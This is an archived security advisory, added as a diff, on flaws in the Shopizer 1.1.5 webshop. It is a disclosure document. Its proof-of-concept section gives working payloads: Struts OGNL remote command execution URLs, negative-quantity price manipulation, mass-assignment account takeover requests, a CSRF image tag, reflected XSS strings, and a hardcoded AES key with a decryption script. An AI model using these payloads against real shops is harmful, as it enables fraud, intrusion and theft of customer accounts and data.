@@ -1,0 +1,334 @@
+id: 22429
+date: 07/12/2014
+title: Shopizer 1.1.5 Multiple Vulnerability
+author: sec-consult
+cves: 
+
+title: Multiple critical vulnerabilities in Shopizer webshop
+            product: Shopizer
+ vulnerable version: 1.1.5 and below
+      fixed version: v2 (new codebase)
+             impact: critical
+           homepage: http://www.shopizer.com/
+              found: 2012-01-10
+                 by: Johannes Dahse, Johannes Greil
+                     SEC Consult Vulnerability Lab
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+- -------------------
+Shopizer is an open source java shopping cart and e-commerce content
+management software (CMS). The system is built on Struts 2, Hibernate and
+Spring. JQuery ui and ajax are heavily used on the ui as well as DWR and
+Struts2-jQuery plug-in. (http://www.shopizer.com/)
+
+
+Vulnerability overview/description:
+- -----------------------------------
+Shopizer is prone to at least the following vulnerabilities, some of them are highly
+critical:
+
+1.) Remote Command Execution
+
+Shopizer 1.1.5 is using Apache Struts 2.2.1.1 and is thus vulnerable to Remote
+Command Execution. Shopizer 1.1.3 and below is built on Apache Struts 2.1.6
+and is also affected.
+
+Fore more details please refer to:
+ * https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm#a18
+ * http://blog.o0o.nu/2012/01/cve-2011-3923-yet-another-struts2.html
+
+This affects the shop and admin interface (central).
+
+2.) Manipulation of product prices
+
+When buying products in Shopizer the product costs for a single product is
+calculated by the selected quantity times the price of the product. The
+total costs of all products is the adding of all product costs. An attacker
+can specify negative quantities to decrease the total costs.
+
+This affects the shop.
+
+3.) Manipulation of customer data / mass assignment
+
+An attacker can change the contact details of a customer by modifying the
+customerId in the change request. In example this allows him to modify the
+shipping address to retrieve products bought by another customer.
+
+Furthermore, a malicious admin user (sm-central) is able to change the
+passwords of other user accounts by appending a "customer.customerPassword"
+HTTP parameter when saving user details. This is possible _although_ there
+is no UI (form field) for this within the admin interface.
+
+This affects the shop and admin interface (central).
+
+4.) Cross-Site Request Forgery
+
+Modifying customer data is also prone to CSRF attacks. Additionally, the
+attacker can change customer passwords, shop configuration, product details
+and product prices by sending CSRF requests to the administration interface.
+
+This affects the shop and admin interface (central).
+
+5.) Missing anti brute force protection
+
+No protection against brute force attacks regarding login credentials is
+implemented. Attackers can guess for weak passwords of users, as the
+password policy of the shop only allows exactly between 6 and 8 characters.
+The use of special chars or digits is not being enforced.
+
+This affects the shop and admin interface (central).
+
+6.) Cross-Site Scripting
+
+The Shopizer Admin Interface suffers from multiple reflected XSS
+vulnerabilities.
+
+
+
+Proof of concept:
+- -----------------
+1.) Remote Command Execution in Struts
+
+a) Via exception
+
+The following URL will trigger an exception for an invalid "productId" data
+type and Struts will re-evaluate the specified value as OGNL expression. An
+attacker can successfully bypass security restrictions of Struts and execute
+arbitrary Java code, leading to Remote Command Execution.
+  /shop/product/reviews.action?product.productId=secconsult'%2b(%23context["xwork.MethodAccessor.denyMethodExecution"]=false,%23_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec('calc'))%2b'
+
+Other numeric parameters are affected as well.
+
+b) Via ParameterInterceptor
+
+The following URL will store a OGNL expression in the property "search" of
+type String. This OGNL expression can then be accessed by a dynamic function
+call in another parameter leading to Remote Command Execution.
+  /shop/search.action?search=(%23context["xwork.MethodAccessor.denyMethodExecution"]=false,%23_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec('calc'))(secconsult)&z[(search)('secconsult')]=true
+
+  
+2.) Manipulation of product prices
+
+Assuming the shop has a product1 (300$) and a product2 (290$) for the total
+costs of 590$. The following steps can be reproduced by a malicious user to
+decrease the total costs when buying those products:
+
+  a) Add product1 and product2 to the shopping cart
+  b) Go to the shopping cart and press "recalculate"
+  c) Intercept the ajax DWR request and modify the number reference of the
+     parameter "productQuantity" for product2 to a negative value (-1):
+
+    c0-e3=string:2
+    c0-e4=number:-1
+    c0-e1=Object_Object:{productId:reference:c0-e3, productQuantity:reference:c0-e4}
+
+  d) The new costs for product2 now recalculate to: -1 x 290 = -290$
+  e) the new total costs is: product1 + product2 = 300$ + (-290$) = 10$
+  f) continue shopping and pay 10$ for products worth 590$.
+
+This is especially critical for shops that only provide digital products.
+
+Furthermore, during the second step of the checkout process it is
+possible to add a negative quantity of products exploiting a Shopizer's
+feature called "standalone shopping cart". This results in a negative price.
+By issuing the following specially crafted request in the separate tab of
+the web browser, while the first tab contains the second step of the checkout
+process, the total price will be decreased. Note that the page must be
+refreshed after the request to reflect the changes.
+
+  /shop/cart/addToCart?merchantId=1&productId=43&qty=-240
+
+
+3.) Manipulation of customer data / mass assignment
+
+It's possible to overwrite user data of an arbitrary
+user and gain access to his account and personal information _when
+registering a new user_.
+To achieve this, a malicious user has to add the customer.customerId
+parameter to the HTTP request and specify the value of the parameter
+to match the target user e.g. 87 when registering a new user.
+For example, the following request will overwrite the user data
+including username and password of the user with the ID 87.
+
+  POST /shop/profile/register.action HTTP/1.1
+  [...]
+  struts.token.name=struts.token&struts.token=8393EPOT4BN4CNYAJ6ETRI9DNR2FSP1R&formstate=list&customer.customerNick=SecTest&newPassword=SecTest123&repeatNewPassword=SecTest123&customer.customerCompany=SecTest&customer.customerGender=M&customer.customerTitel=SecTest&customer.customerFirstname=SecTest&customer.customerLastname=SecTest&customer.customerTelephone=&customer.customerEmailAddress=sectest@example.com&customer.customerCountryId=14&customer.customerZoneId=95&customer.customerPostalCode=SecTest&customer.customerCity=SecTest&customer.customerStreetAddress=SecTest&customer.customerHouseAddress=SecTest&captcha_honeypot=&customer.customerPrivacyRules=1&customer.customerId=87
+
+In this case no account confirmation is needed. Instant access
+to the overwritten account and its data is possible using the
+new username SecTest and the newly specified password! An attacker is able to
+access sensitive data (order information,
+personal information etc.).
+
+Additionally, the following request will overwrite the contact data of customer id 10,
+including the name, shipping address and billing address:
+  /shop/profile/changeAddress.action?formstate=list&customer.customerId=10&customer.customerCompany=secconsult&customer.customerGender=&customer.customerTitel=&customer.customerFirstname=secconsult&customer.customerLastname=secconsult&customer.customerTelephone=00&customer.customerEmailAddress=owned@secconsult.com&customer.customerCountryId=14&customer.customerZoneId=95&customer.customerPostalCode=1190&customer.customerCity=secconsult&customer.customerStreetAddress=secconsult&customer.customerHouseAddress=17&customer.customerAnonymous=false&customer.customerBillingTitel=&customer.customerBillingFirstName=secconsult&customer.customerBillingLastName=secconsult&customer.customerBillingStreetAddress=secconsult&customer.customerBillingHouseAddress=17&customer.customerBillingCity=secconsult&customer.customerBillingZoneId=95&customer.customerBillingState=secconsult&customer.customerBillingPostalCode=1190&customer.customerBillingCountryId=14&customer.customerLang=de&customer.customerPrivacyRul
+es=1&customer.
+customerNick=secconsult
+
+Note that in this specific case the account of the attacker and the victim will not
+be able to login again after the attack, because the nickname will be
+overwritten and found twice during login.
+
+Furthermore, the administration interface does not offer a UI to change user
+passwords. By appending the parameter "customer.customerPassword" an attacker
+is able to change the password of arbitrary users within the customer details
+page.
+
+
+4.) Cross-Site Request Forgery
+
+The following image will alter the product price for the product 30 when
+rendered by the browser of an logged in webshop administrator:
+
+  <img
+src="/central/catalog/saveproduct.action?categ=30&product.productType=1&product.productStatus=true&__checkbox_product.productStatus=true&__checkbox_product.productVirtual=true&__checkbox_product.productIsFree=false&dateavailable=2012-01-24&price=1.00&product.productExternalDl=1&names[0]=secconsult&seo[0]=secconsult&title[0]=secconsult&highlights[0]=secconsult&descriptions[0]=secconsult&metadescriptions[0]=secconsult&downloadurl[0]=&uploadimage=&weight=1.0&width=1.0&length=1.0&height=1.0&product.productQuantity=99&product.productQuantityOrderMax=99&product.productSortOrder=1&product.productTaxClassId=1&product.productId=30&product.productImage=&product.productImageLarge=&product.productImage1=&product.productImage2=&product.productImage3=&product.productImage4="/>
+
+Furthermore, the parameter "__checkbox_product.productIsFree" can also be set
+to "true".
+
+Additionally, the administration interface allows to overwrite the password
+hash of every customer which can also be exploited via CSRF.
+
+The product review form is also vulnerable to Cross-Site Request Forgery
+attacks. A similar request to the following URL will result in a product
+review being posted in the context of the currently logged in user. Note
+that the URL does not contain any parameter that is holding a nonce value.
+
+
+/shop/product/createReview.action?product.productId=43&rating=5&star=5&reviewText=Excellent&=
+
+
+5.) Missing anti brute force protection
+
+No proof-of-concept is necessary. See source:
+sm-central/src/com/salesmanager/central/profile/ProfileAction.java
+Line 525 - 530 of shopizer 1.1.5
+
+
+6.) Cross-Site Scripting
+
+  /central/orders/searchcriteria.action?customername="><script>alert(document.cookie)</script>
+  /central/catalog/productlist.action?productname="><script>alert(document.cookie)</script>&availability=2"><script>alert(document.cookie)</script>&status=2"><script>alert(document.cookie)</script>
+
+E.g. source code:
+sm-central/WebContent/orders/orderlist.jsp
+
+Vulnerability overview/description:
+-----------------------------------
+Shopizer is prone to the following high risk vulnerabilities:
+
+1) Authentication/authorization bypass
+
+The authentication and authorization mechanism provided by the web application
+is prone to an authentication/authorization bypass vulnerability, which can be
+easily exploited by remote attackers for gaining access to private
+information. Malicious actions can be performed by directly calling internal
+methods which are supposed to be accessed only by authenticated and permitted
+users.
+
+
+2) Hardcoded default encryption key
+
+A default encryption key is used across all versions of the Shopizer. It can't
+be changed, for example, by editing a configuration file, because it's
+hardcoded in the source code of the web application. The default encryption
+key can be used to encrypt special values allowing access to the sensitive
+information.
+
+
+
+Proof of concept:
+-----------------
+1) Authentication/authorization bypass
+
+The viewFiles method is vulnerable to authentication bypass. By changing the
+value of the orderId parameter (e.g. by incrementing it) it is possible to
+access and download ordered files of other users. This means that a malicious
+user can completely bypass the checkout process and even he doesn't need an
+account in order to gain access to the data that is sold on the target
+website. In the following example files of the order with the ID 61 will be
+accessed.
+
+        /shop/checkout/viewFiles.action?orderId=61
+
+The removeReview method is vulnerable to authorization bypass. An
+authenticated user can remove arbitrary product reviews by changing the value
+of the reviewId parameter (e.g. by incrementing it). The following URL will
+remove the product review with the ID 398.
+
+        /shop/profile/removeReview.action?reviewId=398
+
+
+2) Hardcoded default encryption key
+
+The hardcoded default encryption key is 1000000000000000
+(SecurityConstants.java) and the default initialization vector is
+fedcba9876543210 (EncryptionUtil.java). Both values were extracted from the
+publicly available versions of the Shopizer. The following is the source code
+of a Python script that can be used to decrypt and encrypt arbitrary values by
+using the extracted keys.
+
+from Crypto.Cipher import AES
+from binascii import unhexlify
+import sys
+
+mode = AES.MODE_CBC
+size = AES.block_size
+
+pad = lambda s: s + (size - len(s) % size) * chr(size - len(s) % size)
+
+def decrypt(ciphertext):
+    ciphertext=unhexlify(ciphertext)
+    decryptor = AES.new('1000000000000000', mode,'fedcba9876543210')
+    plain = decryptor.decrypt(ciphertext)
+    print repr(plain)
+
+def encrypt(plaintext):
+    sample=pad(plaintext)
+    encryptor = AES.new('1000000000000000', mode,'fedcba9876543210')
+    plain = encryptor.encrypt(sample)
+    print plain.encode('hex')
+
+if __name__=='__main__':
+    if len(sys.argv)<3:
+        print "Usage: %s encrypt|decrypt text" % sys.argv[0]
+        sys.exit(1)
+    elif sys.argv[1]=='decrypt':
+        decrypt(sys.argv[2])
+    elif sys.argv[1]=='encrypt':
+        encrypt(sys.argv[2])
+
+The tool can be used to gain access to the invoices of other users. The
+prepareSimpleInvoice action takes encrypted value of the order number that is
+incremental. For example, to gain access to the invoice of the 57 order the
+57|0 string must be encrypted:
+
+C:\>python aes.py encrypt "57|0"
+0664567580f32d3398a981cf51285057
+
+The encrypted string is then used as a value for the fileId parameter of the
+following URL:
+
+        /shop/cart/prepareSimpleInvoice.action?fileId=0664567580f32d3398a981cf51285057
+
+Other parts of the web application such as passwords and ordered files also
+depend on the same encryption keys. If an attacker is able to gain access to
+the database where encrypted user credentials are stored, he can easily
+decrypt and use them in the further attacks.
+
+
+
+Vulnerable / tested versions:
+-----------------------------
+The vulnerabilities have been verified to exist in version 1.1.5 of Shopizer,
+which is the most recent version at the time of discovery.
+
+Solution:
+- ---------
+Using the old version branch 1.x is not recommended as there are no security
+fixes implemented by the vendor.
+
+#  0day.today [2023-03-22]  #
